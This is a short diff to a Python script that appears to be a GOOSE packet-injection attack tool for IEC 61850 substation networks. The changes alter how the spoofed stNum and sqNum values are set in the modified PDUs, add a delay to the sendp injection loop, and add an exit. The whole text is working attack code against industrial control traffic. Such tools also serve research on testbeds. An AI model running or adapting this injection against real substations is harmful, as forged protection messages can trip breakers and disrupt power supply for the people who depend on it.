@@ -309,10 +309,10 @@ for mod_packet in mod_packets:
             continue
 
     # INCREMENT THE STNUM VALUE 
-    mod_pdu_decode.setComponentByName('stNum', (random.randint(0, 100)))
+    mod_pdu_decode.setComponentByName('stNum', (int(tmpSTNUM))+random.randint(0, 10000))
 
     # RESETING THE SQNUM VALUE, note that we will need to increment this or increment stNum and keep this 0
-    mod_pdu_decode.setComponentByName('sqNum', 10) 
+    mod_pdu_decode.setComponentByName('sqNum', 50) 
 
     # WE ALSO HAVE TO CHANGE THE TIMESTAMP WITH THE CURRENT ONE, AND THE TIME SHOULD BE IN 64 BITS
     new_time = curTime64Bits()
@@ -367,6 +367,7 @@ if attack_choice in ['y', 'Y']:
             for mod_packet in mod_packets:
                 sendp(mod_packet, iface=networkInterface)
             flag += 1
+            sleep(5)
     except KeyboardInterrupt:
         print("[-] Stopping the injection...")
 
@@ -386,4 +387,5 @@ elif attack_choice in ['n', 'N']:
             print("[-] Exiting!")
     else:
         print("No action taken on modified packets.")
+        exit(0)
   
